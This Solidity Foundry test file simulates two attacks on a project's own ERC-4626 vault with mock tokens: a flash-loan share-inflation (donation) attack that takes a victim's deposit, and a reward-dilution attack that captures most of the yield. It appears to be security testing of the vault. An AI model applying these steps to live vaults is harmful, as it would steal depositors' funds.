// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";
import {MockERC20} from "../src/MockERC20.sol";

contract VaultFlashLoanAttackTest is Test {
    Vault public vault;
    MockERC20 public asset;
    
    address public attacker = makeAddr("attacker");
    address public victim = makeAddr("victim");
    
    function setUp() public {
        // Deploy mock asset and the vault
        // Note: You may need to adjust the Vault constructor arguments based on your exact implementation 
        // e.g., new Vault(address(asset), "Vault Name", "vToken");
        asset = new MockERC20("Underlying Asset", "ASSET", 18);
        vault = new Vault(address(asset)); 
    }
    
    /**
     * @notice Simulates the ERC-4626 Share Inflation / Donation Attack using a flash loan
     * This addresses the vault price manipulation vector (also documented in FORMAL_VERIFICATION.md).
     */
    function test_FlashLoan_InflationAttack() public {
        uint256 flashLoanAmount = 100_000e18; // Attacker borrows 100k tokens via flash loan
        uint256 victimDeposit = 50_000e18;    // Victim tries to deposit 50k tokens
        
        // 1. Give the victim their initial funds
        deal(address(asset), victim, victimDeposit);
        
        // 2. Attacker takes a flash loan (simulated by dealing tokens directly)
        deal(address(asset), attacker, flashLoanAmount + 1); // +1 wei for the initial deposit
        
        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        
        // 3. Attacker deposits exactly 1 wei to receive 1 share
        vault.deposit(1, attacker);
        assertEq(vault.totalSupply(), 1, "Attacker should have exactly 1 share");
        
        // 4. Attacker "donates" the remaining flash loan amount to inflate the share price
        // This manipulates the totalAssets() without minting new shares.
        asset.transfer(address(vault), flashLoanAmount);
        vm.stopPrank();
        
        // 5. Victim attempts to deposit their 50k tokens
        vm.startPrank(victim);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(victimDeposit, victim);
        vm.stopPrank();
        
        // 6. Attack Success Check: Victim gets 0 shares due to precision loss/rounding down
        // Formula: shares = (assets * totalSupply) / totalAssets
        // shares = (50,000e18 * 1) / (100,000e18 + 1) = 0
        uint256 victimShares = vault.balanceOf(victim);
        assertEq(victimShares, 0, "Victim received 0 shares due to inflation rounding down");
        
        // 7. Attacker cashes out
        vm.startPrank(attacker);
        uint256 attackerBalanceBefore = asset.balanceOf(attacker);
        vault.redeem(vault.balanceOf(attacker), attacker, attacker);
        uint256 attackerBalanceAfter = asset.balanceOf(attacker);
        vm.stopPrank();
        
        // 8. Attacker repays the flash loan
        uint256 attackerProfit = (attackerBalanceAfter - attackerBalanceBefore) - flashLoanAmount;
        
        // The attacker successfully stole the victim's deposit (minus the initial 1 wei)
        assertApproxEqAbs(attackerProfit, victimDeposit, 1, "Attacker stole the victim's deposit");
    }

    /**
     * @notice Simulates a Just-in-Time (JIT) Liquidity / Reward Dilution Attack
     * An attacker uses a massive flash loan to steal yield moments before rewards are distributed.
     */
    function test_FlashLoan_RewardDilution() public {
        uint256 initialUserDeposit = 10_000e18;
        uint256 flashLoanAmount = 90_000e18;
        uint256 rewardAmount = 1_000e18;
        
        // 1. Victim (long-term liquidity provider) deposits
        deal(address(asset), victim, initialUserDeposit);
        vm.startPrank(victim);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(initialUserDeposit, victim);
        vm.stopPrank();
        
        // 2. Attacker takes a massive flash loan right before a harvest/reward distribution
        deal(address(asset), attacker, flashLoanAmount);
        
        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(flashLoanAmount, attacker);
        vm.stopPrank();
        
        // 3. Yield/Rewards are distributed to the vault
        // We simulate this by simply increasing the vault's underlying asset balance
        deal(address(asset), address(vault), asset.balanceOf(address(vault)) + rewardAmount);
        
        // 4. Attacker instantly redeems their shares to claim their portion of the rewards
        vm.startPrank(attacker);
        uint256 attackerShares = vault.balanceOf(attacker);
        vault.redeem(attackerShares, attacker, attacker);
        vm.stopPrank();
        
        // 5. Attacker repays flash loan and checks profit
        uint256 attackerFinalBalance = asset.balanceOf(attacker);
        uint256 attackerProfit = attackerFinalBalance - flashLoanAmount;
        
        // Attacker captures 90% of the yield due to depositing 90% of the TVL via flash loan
        assertApproxEqAbs(attackerProfit, 900e18, 1e18, "Attacker diluted and stole 90% of the rewards");
    }
}